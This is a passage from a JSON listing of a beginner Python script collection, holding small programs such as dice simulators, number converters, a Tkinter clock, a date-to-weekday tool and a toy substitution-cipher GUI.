          "content": "import re  # regular expressions\r\nimport calendar  # module of python to provide useful fucntions related to calendar\r\nimport datetime  # module of python to get the date and time\r\nimport tkinter as tk\r\n\r\nroot = tk.Tk()\r\nroot.geometry(\"400x250+50+50\")\r\nuser_input1 = tk.StringVar()\r\n\r\n\r\ndef process_date(user_input):\r\n    user_input = re.sub(r\"/\", \" \", user_input)  # substitute / with space\r\n    user_input = re.sub(r\"-\", \" \", user_input)  # substitute - with space\r\n    return user_input\r\n\r\n\r\ndef find_day(date):\r\n    born = datetime.datetime.strptime(\r\n        date, \"%d %m %Y\"\r\n    ).weekday()  # this statement returns an integer corresponding to the day of the week\r\n    return calendar.day_name[\r\n        born\r\n    ]  # this statement returns the corresponding day name to the integer generated in the previous statement\r\n\r\n\r\n# To get the input from the user\r\n# User may type 1/2/1999 or 1-2-1999\r\n# To overcome those we have to process user input and make it standard to accept as defined by  calender and time module\r\ndef printt():\r\n    user_input = user_input1.get()\r\n    date = process_date(user_input)\r\n    c = \"Day on \" + user_input + \"  is \" + find_day(date)\r\n    label2 = tk.Label(root, text=c, font=(\"Times new roman\", 20), fg=\"black\").place(\r\n        x=20, y=200\r\n    )\r\n\r\n\r\nlbl = tk.Label(root, text=\"Date --\", font=(\"Ubuntu\", 20), fg=\"black\").place(\r\n    x=0, y=0.1, height=60, width=150\r\n)\r\nlbl1 = tk.Label(root, text=\"(DD/MM/YYYY)\", font=(\"Ubuntu\", 15), fg=\"Gray\").place(\r\n    x=120, y=0.1, height=60, width=150\r\n)\r\nbut = tk.Button(\r\n    root,\r\n    text=\"Check\",\r\n    command=printt,\r\n    cursor=\"hand2\",\r\n    font=(\"Times new roman\", 40),\r\n    fg=\"white\",\r\n    bg=\"black\",\r\n).place(x=50, y=130, height=50, width=300)\r\nDate = tk.Entry(\r\n    root, font=(\"Times new roman\", 20), textvariable=user_input1, bg=\"white\", fg=\"black\"\r\n).place(x=30, y=50, height=40, width=340)\r\n\r\nroot.mainloop()\r\n"
        },
        {
          "name": "dec_to_hex.py",
          "type": "blob",
          "size": 0.0693359375,
          "content": "dec_num = input(\"Enter the decimal number\\n\")\nprint(hex(int(dec_num)))\n"
        },
        {
          "name": "decimal to binary.py",
          "type": "blob",
          "size": 0.2666015625,
          "content": "def decimalToBinary(num):\n    \"\"\"This function converts decimal number\n    to binary and prints it\"\"\"\n    if num > 1:\n        decimalToBinary(num // 2)\n    print(num % 2, end='')\n\n\n# decimal number\nnumber = int(input(\"Enter any decimal number: \"))\n\ndecimalToBinary(number)\n"
        },
        {
          "name": "depreciated_programs",
          "type": "tree",
          "content": null
        },
        {
          "name": "dialogs",
          "type": "tree",
          "content": null
        },
        {
          "name": "diamond.py",
          "type": "blob",
          "size": 0.4150390625,
          "content": "def draw_diamond(n):\n    if n % 2 != 0:\n        k = 1\n        while k <= n:\n            print(\" \" * int((n - k) / 2) + \"*\" * k + \" \" * int((n - k) / 2))\n            k += 2\n\n        j = 1\n        while (n - 2 * j) >= 1:\n            print(\" \" * j + \"*\" * (n - 2 * j) + \" \" * (j))\n            j += 1\n    else:\n        print(\"Not an odd number. Can't draw a diamond :(\")\n\n\nn = int(input(\"Enter an odd number: \"))\ndraw_diamond(n)\n"
        },
        {
          "name": "dice.py",
          "type": "blob",
          "size": 1.13671875,
          "content": "# Script Name\t: dice.py\n# Author\t\t: Craig Richards\n# Created\t\t: 05th February 2017\n# Last Modified\t:\n# Version\t\t: 1.0\n\n# Modifications\t:\n\n# Description\t: This will randomly select two numbers,\n# like throwing dice, you can change the sides of the dice if you wish\n\nimport random\n\n\nclass Die(object):\n    # A dice has a feature of number about how many sides it has when it's\n    # established,like 6.\n    def __init__(self):\n        self.sides = 6\n\n    \"\"\"because a dice contains at least 4 planes.\n    So use this method to give it a judgement when you need\n    to change the instance attributes.\n    \"\"\"\n\n    def set_sides(self, sides_change):\n        if sides_change >= 4:\n            if sides_change != 6:\n                print(\"change sides from 6 to \", sides_change, \" !\")\n            else:\n                # added else clause for printing a message that sides set to 6\n                print(\"sides set to 6\")\n            self.sides = sides_change\n        else:\n            print(\"wrong sides! sides set to 6\")\n\n    def roll(self):\n        return random.randint(1, self.sides)\n\n\nd = Die()\nd1 = Die()\nd.set_sides(4)\nd1.set_sides(4)\nprint(d.roll(), d1.roll())\n"
        },
        {
          "name": "diceV2_dynamic.py",
          "type": "blob",
          "size": 2.6259765625,
          "content": "import random\n\n\n# Class that that holds dice-functions. You can set the amount of sides and roll with each dice object.\nclass Dice:\n    def __init__(self):\n        self.sideCount = 6\n\n    def setSides(self, sides):\n        if sides > 3:\n            self.sides = sides\n        else:\n            print(\n                \"This absolutely shouldn't ever happen. The programmer sucks or someone \"\n                \"has tweaked with code they weren't supposed to touch!\"\n            )\n\n    def roll(self):\n        return random.randint(1, self.sides)\n\n\n# =====================================================================\n\n\n# Checks to make sure that the input is actually an integer.\n# This implementation can be improved greatly of course.\ndef checkInput(sides):\n    try:\n        if int(sides) != 0:\n            if (\n                float(sides) % int(sides) == 0\n            ):  # excludes the possibility of inputted floats being rounded.\n                return int(sides)\n        else:\n            return int(sides)\n\n    except ValueError:\n        print(\"Invalid input!\")\n        return None\n\n\n# Picks a number that is at least of a certain size.\n# That means in this program, the dices being possible to use in 3 dimensional space.\ndef pickNumber(item, question_string, lower_limit):\n    while True:\n        item = input(question_string)\n        item = checkInput(item)\n        if type(item) == int:\n            if item <= lower_limit:\n                print(\"Input too low!\")\n                continue\n            else:\n                return item\n\n\n# Main-function of the program that sets up the dices for the user as they want them.\ndef getDices():\n    dices = []\n    sides = None\n    diceAmount = None\n    sideLowerLimit = 3  # Do Not Touch!\n    diceLowerLimit = 1  # Do Not Touch!\n\n    sides = pickNumber(sides, \"How many sides will the dices have?: \", sideLowerLimit)\n    diceAmount = pickNumber(\n        diceAmount, \"How many dices will do you want?: \", diceLowerLimit\n    )\n\n    for i in range(0, diceAmount):\n        d = Dice()\n        d.setSides(sides)\n        dices.append(d)\n\n    return dices\n\n\n# =================================================================\n# Output section.\n\n\ndef output():\n    dices = getDices()\n    input(\"Do you wanna roll? press enter\")\n    cont = True\n    while cont:\n        rollOutput = \"\"\n        for dice in dices:\n            rollOutput = rollOutput + str(dice.roll()) + \", \"\n        rollOutput = rollOutput[:-2]\n        print(rollOutput)\n\n        print(\"do you want to roll again?\")\n        ans = input(\"press enter to continue, and [exit] to exit\")\n        if ans == \"exit\":\n            cont = False\n\n\nif __name__ == \"__main__\":\n    output()\n"
        },
        {
          "name": "dice_rolling_simulator.py",
          "type": "blob",
          "size": 2.2509765625,
          "content": "# Made on May 27th, 2017\n# Made by SlimxShadyx\n# Editted by CaptMcTavish, June 17th, 2017\n# Comments edits by SlimxShadyx, August 11th, 2017\n\n# Dice Rolling Simulator\n\nimport random\n\ntry:\n    input = raw_input\nexcept NameError:\n    pass\n\nglobal user_exit_checker\nuser_exit_checker = \"exit\"\n\n\n# Our start function (What the user will first see when starting the program)\n\n\ndef start():\n    print(\"Welcome to dice rolling simulator: \\nPress Enter to proceed\")\n    input(\">\")\n\n    # Starting our result function (The dice picker function)\n    result()\n\n\n# Our exit function (What the user will see when choosing to exit the program)\ndef bye():\n    print(\"Thanks for using the Dice Rolling Simulator! Have a great day! =)\")\n\n\n# Result function which is our dice chooser function\ndef result():\n    # user_dice_chooser  No idea how this got in here, thanks EroMonsterSanji.\n\n    print(\"\\r\\nGreat! Begin by choosing a die! [6] [8] [12]?\\r\\n\")\n    user_dice_chooser = input(\">\")\n\n    user_dice_chooser = int(user_dice_chooser)\n\n    # Below is the references to our dice functions (Below), when the user chooses a dice.\n    if user_dice_chooser == 6:\n        dice6()\n\n    elif user_dice_chooser == 8:\n        dice8()\n\n    elif user_dice_chooser == 12:\n        dice12()\n\n    # If the user doesn't choose an applicable option\n    else:\n        print(\"\\r\\nPlease choose one of the applicable options!\\r\\n\")\n        result()\n\n\n# Below are our dice functions.\ndef dice6():\n    # Getting a random number between 1 and 6 and printing it.\n    dice_6 = random.randint(1, 6)\n    print(\"\\r\\nYou rolled a \" + str(dice_6) + \"!\\r\\n\")\n\n    user_exit_checker()\n\n\ndef dice8():\n    dice_8 = random.randint(1, 8)\n    print(\"\\r\\nYou rolled a \" + str(dice_8) + \"!\")\n\n    user_exit_checker()\n\n\ndef dice12():\n    dice_12 = random.randint(1, 12)\n    print(\"\\r\\nYou rolled a \" + str(dice_12) + \"!\")\n\n    user_exit_checker()\n\n\ndef user_exit_checker():\n    # Checking if the user would like to roll another die, or to exit the program\n    user_exit_checker_raw = input(\n        \"\\r\\nIf you want to roll another die, type [roll]. To exit, type [exit].\\r\\n?>\"\n    )\n    user_exit_checker = user_exit_checker_raw.lower()\n    if user_exit_checker == \"roll\":\n        start()\n    else:\n        bye()\n\n\n# Actually starting the program now.\nstart()\n"
        },
        {
          "name": "diction.py",
          "type": "blob",
          "size": 1.587890625,
          "content": "from difflib import get_close_matches\nimport pyttsx3\nimport json\nimport speech_recognition as sr\n\ndata = json.load(open(\"data.json\"))\nengine = pyttsx3.init()\nvoices = engine.getProperty(\"voices\")\nengine.setProperty(\"voice\", voices[0].id)\n\n\ndef speak(audio):\n    engine.say(audio)\n    engine.runAndWait()\n\n\ndef takeCommand():\n    r = sr.Recognizer()\n    with sr.Microphone() as source:\n        print(\"Listening...\")\n        r.pause_threshold = 1\n        r.energy_threshold = 494\n        r.adjust_for_ambient_noise(source, duration=1.5)\n        audio = r.listen(source)\n\n    try:\n        print(\"Recognizing..\")\n        query = r.recognize_google(audio, language=\"en-in\")\n        print(f\"User said: {query}\\n\")\n\n    except Exception as e:\n        # print(e)\n\n        print(\"Say that again please...\")\n        return \"None\"\n    return query\n\n\ndef translate(word):\n    word = word.lower()\n    if word in data:\n        speak(\"Here is what I found in dictionary..\")\n        d = data[word]\n        d = \"\".join(str(e) for e in d)\n        speak(d)\n    elif len(get_close_matches(word, data.keys())) > 0:\n        x = get_close_matches(word, data.keys())[0]\n        speak(\"Did you mean \" + x + \" instead,  respond with Yes or No.\")\n        ans = takeCommand().lower()\n        if \"yes\" in ans:\n            speak(\"ok \" + \"It means..\" + data[x])\n        elif \"no\" in ans:\n            speak(\"Word doesn't exist. Please make sure you spelled it correctly.\")\n        else:\n            speak(\"We didn't understand your entry.\")\n\n    else:\n        speak(\"Word doesn't exist. Please double check it.\")\n\n\nif __name__ == \"__main__\":\n    translate()\n"
        },
        {
          "name": "different model output",
          "type": "blob",
          "size": 0.2890625,
          "content": "Model Output\n\nDecision tree :\n    Mean:  4.207225187158817\n    Standard deviation:  0.8745567547159991\n\nlinear Regression :\n    Mean:  5.030437102767307\n    Standard deviation:  1.0607661158294834\n\nRandom forest regressor:\n    Mean:  3.3009631251857217\n    Standard deviation:  0.7076841067486248"
        },
        {
          "name": "digital_clock.py",
          "type": "blob",
          "size": 1.349609375,
          "content": "# master\n# importing whole module\n# use Tkinter to show a digital clock\n# using python code base\n\nimport time\n\n# because we need digital clock , so we are importing the time library.\n#  master\nfrom tkinter import *\nfrom tkinter.ttk import *\n\n# importing strftime function to\n# retrieve system's time\nfrom time import strftime\n\n# creating tkinter window\nroot = Tk()\nroot.title(\"Clock\")\n\n# master\n\n# This function is used to\n# display time on the label\ndef def_time():\n    string = strftime(\"%H:%M:%S %p\")\n    lbl.config(text=string)\n    lbl.after(1000, time)\n\n\n# Styling the label widget so that clock\n# will look more attractive\nlbl = Label(\n    root,\n    font=(\"calibri\", 40, \"bold\", \"italic\"),\n    background=\"Black\",\n    foreground=\"Yellow\",\n)\n\n# Placing clock at the centre\n# of the tkinter window\nlbl.pack(anchor=\"center\")\ndef_time()\n\nmainloop()\n# =======\nlabel = Label(root, font=(\"Arial\", 30, \"bold\"), bg=\"black\", fg=\"white\", bd=30)\nlabel.grid(row=0, column=1)\n\n\n# function to declare the tkniter clock\ndef dig_clock():\n\n    text_input = time.strftime(\"%H : %M : %S\")  # get the current local time from the PC\n\n    label.config(text=text_input)\n\n    # calls itself every 200 milliseconds\n    # to update the time display as needed\n    # could use >200 ms, but display gets jerky\n\n    label.after(200, dig_clock)\n\n\n# calling the function\ndig_clock()\n\nroot.mainloop()\n# master\n"
        },
        {
          "name": "dir_test.py",
          "type": "blob",
          "size": 1.1083984375,
          "content": "# Script Name\t\t: dir_test.py\n# Author\t\t\t\t: Craig Richards\n# Created\t\t\t\t: 29th November 2011\n# Last Modified\t\t: by- Joshua Covington 05 Oct 2020\n# Version\t\t\t\t: 1.0\n# Modifications\t\t:\n\n# Description\t\t\t: Tests to see if the directory testdir exists, if not it will create the directory for you if you want it created.\nfrom __future__ import print_function\n\nimport os\n\ntry:\n    input = raw_input()\nexcept NameError:\n    pass\n\n\ndef main():\n    CheckDir = input(\"Enter the name of the directory to check : \")\n    print()\n\n    if os.path.exists(CheckDir):  # Checks if the dir exists\n        print(\"The directory exists\")\n    else:\n        print(\"No directory found for \" + CheckDir)  # Output if no directory\n        print()\n        option = input(\"Would you like this directory create? y/n: \")\n        if option == \"n\":\n            print(\"Goodbye\")\n            exit()\n        if option == \"y\":\n            os.makedirs(CheckDir)  # Creates a new dir for the given name\n            print(\"Directory created for \" + CheckDir)\n        else:\n            print(\"Not an option. Exiting\")\n            exit()\n\n\nif __name__ == \"__main__\":\n    main()\n"
        },
        {
          "name": "divisors_of_a_number.py",
          "type": "blob",
          "size": 0.55859375,
          "content": "a = 0\nwhile a<= 0 :\n    number_to_divide = input(\"choose the number to divide -->\")\n    try :\n        a = int(number_to_divide)\n    except ValueError :\n        a = 0\n    if a <= 0 :\n        print('choose a number grether than 0')\nlist_number_divided = []\n\nfor number in range(1,a + 1) :\n    b = a % number\n    if b == 0 :\n        list_number_divided.append(number)\nprint('\\nthe number ' + number_to_divide + ' can be divided by:')\nfor item in list_number_divided :\n     print(f'{item}')\nif len(list_number_divided) <= 2 :\n    print(number_to_divide + ' is a prime number')"
        },
        {
          "name": "email id dictionary",
          "type": "tree",
          "content": null
        },
        {
          "name": "encrypter-decrypter-gui.py",
          "type": "blob",
          "size": 8.4423828125,
          "content": "# ==================== Importing Libraries ====================\n# =============================================================\nimport tkinter as tk\nfrom tkinter import ttk\nfrom tkinter.messagebox import showerror\nfrom tkinter.scrolledtext import ScrolledText\n\n# =============================================================\n\n\nclass Main(tk.Tk):\n    def __init__(self, *args, **kwargs):\n        super().__init__(*args, **kwargs)\n        self.title(\"Alphacrypter\")\n        # ----- Setting Geometry -----\n        self.geometry_settings()\n\n    def geometry_settings(self):\n        _com_scr_w = self.winfo_screenwidth()\n        _com_scr_h = self.winfo_screenheight()\n        _my_w = 300\n        _my_h = 450\n        # ----- Now Getting X and Y Coordinates\n        _x = int(_com_scr_w / 2 - _my_w / 2)\n        _y = int(_com_scr_h / 2 - _my_h / 2)\n        _geo_string = str(_my_w) + \"x\" + str(_my_h) + \"+\" + str(_x) + \"+\" + str(_y)\n        self.geometry(_geo_string)\n        # ----- Geometry Setting Completed Now Disabling Resize Screen Button -----\n        self.resizable(width=False, height=False)\n\n\nclass Notebook:\n    def __init__(self, parent):\n        self.parent = parent\n        # ========== Data Key ==========\n        self.data_dic = {\n            \"A\": \"Q\",\n            \"B\": \"W\",\n            \"C\": \"E\",\n            \"D\": \"R\",\n            \"E\": \"T\",\n            \"F\": \"Y\",\n            \"G\": \"U\",\n            \"H\": \"I\",\n            \"I\": \"O\",\n            \"J\": \"P\",\n            \"K\": \"A\",\n            \"L\": \"S\",\n            \"M\": \"D\",\n            \"N\": \"F\",\n            \"O\": \"G\",\n            \"P\": \"H\",\n            \"Q\": \"J\",\n            \"R\": \"K\",\n            \"S\": \"L\",\n            \"T\": \"Z\",\n            \"U\": \"X\",\n            \"V\": \"C\",\n            \"W\": \"V\",\n            \"X\": \"B\",\n            \"Y\": \"N\",\n            \"Z\": \"M\",\n            \"a\": \"q\",\n            \"b\": \"w\",\n            \"c\": \"e\",\n            \"d\": \"r\",\n            \"e\": \"t\",\n            \"f\": \"y\",\n            \"g\": \"u\",\n            \"h\": \"i\",\n            \"i\": \"o\",\n            \"j\": \"p\",\n            \"k\": \"a\",\n            \"l\": \"s\",\n            \"m\": \"d\",\n            \"n\": \"f\",\n            \"o\": \"g\",\n            \"p\": \"h\",\n            \"q\": \"j\",\n            \"r\": \"k\",\n            \"s\": \"l\",\n            \"t\": \"z\",\n            \"u\": \"x\",\n            \"v\": \"c\",\n            \"w\": \"v\",\n            \"x\": \"b\",\n            \"y\": \"n\",\n            \"z\": \"m\",\n            \"1\": \"_\",\n            \"2\": \"-\",\n            \"3\": \"|\",\n            \"4\": \"?\",\n            \"5\": \"*\",\n            \"6\": \"!\",\n            \"7\": \"@\",\n            \"8\": \"#\",\n            \"9\": \"$\",\n            \"0\": \"~\",\n            \".\": \"/\",\n            \",\": \"+\",\n            \" \": \"&\",\n        }\n        # ==============================\n        # ----- Notebook With Two Pages -----\n        self.nb = ttk.Notebook(self.parent)\n        self.page1 = ttk.Frame(self.nb)\n        self.page2 = ttk.Frame(self.nb)\n        self.nb.add(self.page1, text=\"Encrypt The Words\")\n        self.nb.add(self.page2, text=\"Decrypt The Words\")\n        self.nb.pack(expand=True, fill=\"both\")\n        # ----- LabelFrames -----\n        self.page1_main_label = ttk.LabelFrame(\n            self.page1, text=\"Encrypt Any Text\"\n        )  # <----- Page1 LabelFrame1\n        self.page1_main_label.grid(row=0, column=0, pady=20, padx=2, ipadx=20)\n        self.page1_output_label = ttk.LabelFrame(self.page1, text=\"Decrypted Text\")\n        self.page1_output_label.grid(row=1, column=0, pady=10, padx=2)\n\n        self.page2_main_label = ttk.LabelFrame(\n            self.page2, text=\"Decrypt Any Text\"\n        )  # <----- Page1 LabelFrame1\n        self.page2_main_label.grid(row=0, column=0, pady=20, padx=2, ipadx=20)\n        self.page2_output_label = ttk.LabelFrame(self.page2, text=\"Real Text\")\n        self.page2_output_label.grid(row=1, column=0, pady=10, padx=2)\n        # <---Scrolled Text Global\n        self.decrypted_text_box = ScrolledText(\n            self.page1_output_label, width=30, height=5, state=\"normal\"\n        )\n        self.decrypted_text_box.grid(row=1, column=0, padx=2, pady=10)\n\n        self.text_box = ScrolledText(\n            self.page2_output_label, width=30, height=5, state=\"normal\"\n        )\n        self.text_box.grid(row=1, column=0, padx=2, pady=10)\n        # ----- Variables -----\n        self.user_text = tk.StringVar()\n        self.decrypted_user_text = tk.StringVar()\n\n        self.user_text2 = tk.StringVar()\n        self.real_text = tk.StringVar()\n        # ----- Getting Inside Page1 -----\n        self.page1_inside()\n        self.page2_inside()\n\n    def page1_inside(self):\n        style = ttk.Style()\n        user_text_label = ttk.Label(\n            self.page1_main_label, text=\"Enter Your Text Here : \", font=(\"\", 14)\n        )\n        user_text_label.grid(row=0, column=0, pady=10)\n        user_entry_box = ttk.Entry(\n            self.page1_main_label, width=35, textvariable=self.user_text\n        )\n        user_entry_box.grid(row=1, column=0)\n        style.configure(\n            \"TButton\",\n            foreground=\"black\",\n            background=\"white\",\n            relief=\"groove\",\n            font=(\"\", 12),\n        )\n        encrypt_btn = ttk.Button(\n            self.page1_main_label,\n            text=\"Encrypt Text\",\n            style=\"TButton\",\n            command=self.encrypt_now,\n        )\n        encrypt_btn.grid(row=2, column=0, pady=15)\n\n    # ---------- Page1 Button Binding Function ----------\n\n    def encrypt_now(self):\n        user_text = self.user_text.get()\n        if user_text == \"\":\n            showerror(\n                \"Nothing Found\", \"Please Enter Something In Entry Box To Encrypt...!\"\n            )\n            return\n        else:\n            self.decrypted_user_text = self.backend_work(\"Encrypt\", user_text)\n            self.decrypted_text_box.insert(tk.INSERT, self.decrypted_user_text, tk.END)\n\n    # --------------------------------------------------Binding Functions of Page1 End Here\n    # Page2 ------------------>\n    def page2_inside(self):\n        style = ttk.Style()\n        user_text_label = ttk.Label(\n            self.page2_main_label, text=\"Enter Decrypted Text Here : \", font=(\"\", 14)\n        )\n        user_text_label.grid(row=0, column=0, pady=10)\n        user_entry_box = ttk.Entry(\n            self.page2_main_label, width=35, textvariable=self.user_text2\n        )\n        user_entry_box.grid(row=1, column=0)\n        style.configure(\n            \"TButton\",\n            foreground=\"black\",\n            background=\"white\",\n            relief=\"groove\",\n            font=(\"\", 12),\n        )\n        encrypt_btn = ttk.Button(\n            self.page2_main_label,\n            text=\"Decrypt Text\",\n            style=\"TButton\",\n            command=self.decrypt_now,\n        )\n        encrypt_btn.grid(row=2, column=0, pady=15)\n        # ---------- Page1 Button Binding Function ----------\n\n    def decrypt_now(self):\n        user_text = self.user_text2.get()\n        if user_text == \"\":\n            showerror(\n                \"Nothing Found\", \"Please Enter Something In Entry Box To Encrypt...!\"\n            )\n            return\n        else:\n            self.real_text = self.backend_work(\"Decrypt\", user_text)\n            self.text_box.insert(tk.INSERT, self.real_text, tk.END)\n\n    def backend_work(self, todo, text_coming):\n        text_to_return = \"\"\n        if todo == \"Encrypt\":\n            try:\n                text_coming = str(\n                    text_coming\n                )  # <----- Lowering the letters as dic in lower letter\n                for word in text_coming:\n                    for key, value in self.data_dic.items():\n                        if word == key:\n                            # print(word, \" : \", key)\n                            text_to_return += value\n\n            except ValueError:\n                showerror(\"Unknown\", \"Something Went Wrong, Please Restart Application\")\n\n            return text_to_return\n        elif todo == \"Decrypt\":\n            try:\n                text_coming = str(text_coming)\n                for word in text_coming:\n                    for key, value in self.data_dic.items():\n                        if word == value:\n                            text_to_return += key\n\n            except ValueError:\n                showerror(\"Unknown\", \"Something Went Wrong, Please Restart Application\")\n\n            return text_to_return\n\n        else:\n            showerror(\"No Function\", \"Function Could not get what to do...!\")\n\n\n# =============================================================\n# ==================== Classes End Here ... ! =================\n\n\nif __name__ == \"__main__\":\n    run = Main()\n    Notebook(run)\n    run.mainloop()\n"
        },
        {
          "name": "encrypter_decrypter_gui.py",
          "type": "blob",
          "size": 8.4423828125,
          "content": "# ==================== Importing Libraries ====================\n# =============================================================\nimport tkinter as tk\nfrom tkinter import ttk\nfrom tkinter.messagebox import showerror\nfrom tkinter.scrolledtext import ScrolledText\n\n# =============================================================\n\n\nclass Main(tk.Tk):\n    def __init__(self, *args, **kwargs):\n        super().__init__(*args, **kwargs)\n        self.title(\"Alphacrypter\")\n        # ----- Setting Geometry -----\n        self.geometry_settings()\n\n    def geometry_settings(self):\n        _com_scr_w = self.winfo_screenwidth()\n        _com_scr_h = self.winfo_screenheight()\n        _my_w = 300\n        _my_h = 450\n        # ----- Now Getting X and Y Coordinates\n        _x = int(_com_scr_w / 2 - _my_w / 2)\n        _y = int(_com_scr_h / 2 - _my_h / 2)\n        _geo_string = str(_my_w) + \"x\" + str(_my_h) + \"+\" + str(_x) + \"+\" + str(_y)\n        self.geometry(_geo_string)\n        # ----- Geometry Setting Completed Now Disabling Resize Screen Button -----\n        self.resizable(width=False, height=False)\n\n\nclass Notebook:\n    def __init__(self, parent):\n        self.parent = parent\n        # ========== Data Key ==========\n        self.data_dic = {\n            \"A\": \"Q\",\n            \"B\": \"W\",\n            \"C\": \"E\",\n            \"D\": \"R\",\n            \"E\": \"T\",\n            \"F\": \"Y\",\n            \"G\": \"U\",\n            \"H\": \"I\",\n            \"I\": \"O\",\n            \"J\": \"P\",\n            \"K\": \"A\",\n            \"L\": \"S\",\n            \"M\": \"D\",\n            \"N\": \"F\",\n            \"O\": \"G\",\n            \"P\": \"H\",\n            \"Q\": \"J\",\n            \"R\": \"K\",\n            \"S\": \"L\",\n            \"T\": \"Z\",\n            \"U\": \"X\",\n            \"V\": \"C\",\n            \"W\": \"V\",\n            \"X\": \"B\",\n            \"Y\": \"N\",\n            \"Z\": \"M\",\n            \"a\": \"q\",\n            \"b\": \"w\",\n            \"c\": \"e\",\n            \"d\": \"r\",\n            \"e\": \"t\",\n            \"f\": \"y\",\n            \"g\": \"u\",\n            \"h\": \"i\",\n            \"i\": \"o\",\n            \"j\": \"p\",\n            \"k\": \"a\",\n            \"l\": \"s\",\n            \"m\": \"d\",\n            \"n\": \"f\",\n            \"o\": \"g\",\n            \"p\": \"h\",\n            \"q\": \"j\",\n            \"r\": \"k\",\n            \"s\": \"l\",\n            \"t\": \"z\",\n            \"u\": \"x\",\n            \"v\": \"c\",\n            \"w\": \"v\",\n            \"x\": \"b\",\n            \"y\": \"n\",\n            \"z\": \"m\",\n            \"1\": \"_\",\n            \"2\": \"-\",\n            \"3\": \"|\",\n            \"4\": \"?\",\n            \"5\": \"*\",\n            \"6\": \"!\",\n            \"7\": \"@\",\n            \"8\": \"#\",\n            \"9\": \"$\",\n            \"0\": \"~\",\n            \".\": \"/\",\n            \",\": \"+\",\n            \" \": \"&\",\n        }\n        # ==============================\n        # ----- Notebook With Two Pages -----\n        self.nb = ttk.Notebook(self.parent)\n        self.page1 = ttk.Frame(self.nb)\n        self.page2 = ttk.Frame(self.nb)\n        self.nb.add(self.page1, text=\"Encrypt The Words\")\n        self.nb.add(self.page2, text=\"Decrypt The Words\")\n        self.nb.pack(expand=True, fill=\"both\")\n        # ----- LabelFrames -----\n        self.page1_main_label = ttk.LabelFrame(\n            self.page1, text=\"Encrypt Any Text\"\n        )  # <----- Page1 LabelFrame1\n        self.page1_main_label.grid(row=0, column=0, pady=20, padx=2, ipadx=20)\n        self.page1_output_label = ttk.LabelFrame(self.page1, text=\"Decrypted Text\")\n        self.page1_output_label.grid(row=1, column=0, pady=10, padx=2)\n\n        self.page2_main_label = ttk.LabelFrame(\n            self.page2, text=\"Decrypt Any Text\"\n        )  # <----- Page1 LabelFrame1\n        self.page2_main_label.grid(row=0, column=0, pady=20, padx=2, ipadx=20)\n        self.page2_output_label = ttk.LabelFrame(self.page2, text=\"Real Text\")\n        self.page2_output_label.grid(row=1, column=0, pady=10, padx=2)\n        # <---Scrolled Text Global\n        self.decrypted_text_box = ScrolledText(\n            self.page1_output_label, width=30, height=5, state=\"normal\"\n        )\n        self.decrypted_text_box.grid(row=1, column=0, padx=2, pady=10)\n\n        self.text_box = ScrolledText(\n            self.page2_output_label, width=30, height=5, state=\"normal\"\n        )\n        self.text_box.grid(row=1, column=0, padx=2, pady=10)\n        # ----- Variables -----\n        self.user_text = tk.StringVar()\n        self.decrypted_user_text = tk.StringVar()\n\n        self.user_text2 = tk.StringVar()\n        self.real_text = tk.StringVar()\n        # ----- Getting Inside Page1 -----\n        self.page1_inside()\n        self.page2_inside()\n\n    def page1_inside(self):\n        style = ttk.Style()\n        user_text_label = ttk.Label(\n            self.page1_main_label, text=\"Enter Your Text Here : \", font=(\"\", 14)\n        )\n        user_text_label.grid(row=0, column=0, pady=10)\n        user_entry_box = ttk.Entry(\n            self.page1_main_label, width=35, textvariable=self.user_text\n        )\n        user_entry_box.grid(row=1, column=0)\n        style.configure(\n            \"TButton\",\n            foreground=\"black\",\n            background=\"white\",\n            relief=\"groove\",\n            font=(\"\", 12),\n        )\n        encrypt_btn = ttk.Button(\n            self.page1_main_label,\n            text=\"Encrypt Text\",\n            style=\"TButton\",\n            command=self.encrypt_now,\n        )\n        encrypt_btn.grid(row=2, column=0, pady=15)\n\n    # ---------- Page1 Button Binding Function ----------\n\n    def encrypt_now(self):\n        user_text = self.user_text.get()\n        if user_text == \"\":\n            showerror(\n                \"Nothing Found\", \"Please Enter Something In Entry Box To Encrypt...!\"\n            )\n            return\n        else:\n            self.decrypted_user_text = self.backend_work(\"Encrypt\", user_text)\n            self.decrypted_text_box.insert(tk.INSERT, self.decrypted_user_text, tk.END)\n\n    # --------------------------------------------------Binding Functions of Page1 End Here\n    # Page2 ------------------>\n    def page2_inside(self):\n        style = ttk.Style()\n        user_text_label = ttk.Label(\n            self.page2_main_label, text=\"Enter Decrypted Text Here : \", font=(\"\", 14)\n        )\n        user_text_label.grid(row=0, column=0, pady=10)\n        user_entry_box = ttk.Entry(\n            self.page2_main_label, width=35, textvariable=self.user_text2\n        )\n        user_entry_box.grid(row=1, column=0)\n        style.configure(\n            \"TButton\",\n            foreground=\"black\",\n            background=\"white\",\n            relief=\"groove\",\n            font=(\"\", 12),\n        )\n        encrypt_btn = ttk.Button(\n            self.page2_main_label,\n            text=\"Decrypt Text\",\n            style=\"TButton\",\n            command=self.decrypt_now,\n        )\n        encrypt_btn.grid(row=2, column=0, pady=15)\n        # ---------- Page1 Button Binding Function ----------\n\n    def decrypt_now(self):\n        user_text = self.user_text2.get()\n        if user_text == \"\":\n            showerror(\n                \"Nothing Found\", \"Please Enter Something In Entry Box To Encrypt...!\"\n            )\n            return\n        else:\n            self.real_text = self.backend_work(\"Decrypt\", user_text)\n            self.text_box.insert(tk.INSERT, self.real_text, tk.END)\n\n    def backend_work(self, todo, text_coming):\n        text_to_return = \"\"\n        if todo == \"Encrypt\":\n            try:\n                text_coming = str(\n                    text_coming\n                )  # <----- Lowering the letters as dic in lower letter\n                for word in text_coming:\n                    for key, value in self.data_dic.items():\n                        if word == key:\n                            # print(word, \" : \", key)\n                            text_to_return += value\n\n            except ValueError:\n                showerror(\"Unknown\", \"Something Went Wrong, Please Restart Application\")\n\n            return text_to_return\n        elif todo == \"Decrypt\":\n            try:\n                text_coming = str(text_coming)\n                for word in text_coming:\n                    for key, value in self.data_dic.items():\n                        if word == value:\n                            text_to_return += key\n\n            except ValueError:\n                showerror(\"Unknown\", \"Something Went Wrong, Please Restart Application\")\n\n            return text_to_return\n\n        else:\n            showerror(\"No Function\", \"Function Could not get what to do...!\")\n\n\n# =============================================================\n# ==================== Classes End Here ... ! =================\n\n\nif __name__ == \"__main__\":\n    run = Main()\n    Notebook(run)\n    run.mainloop()\n"
        },
        {
          "name": "encryptsys.py",
          "type": "blob",
          "size": 1.984375,
